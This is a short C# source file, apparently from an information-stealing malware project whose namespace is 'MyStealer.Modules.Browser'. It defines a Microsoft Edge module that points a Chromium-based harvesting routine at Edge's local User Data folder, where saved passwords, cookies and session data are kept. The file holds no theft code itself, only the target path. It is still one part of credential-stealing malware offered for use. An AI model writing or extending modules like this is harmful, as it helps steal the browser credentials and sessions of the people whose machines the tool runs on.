using System.IO;
using System;

namespace MyStealer.Modules.Browser.ChromiumBased
{
    internal class MicrosoftEdge : Chromium
    {
        public override string ApplicationName => "Microsoft Edge";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data");
    }
}
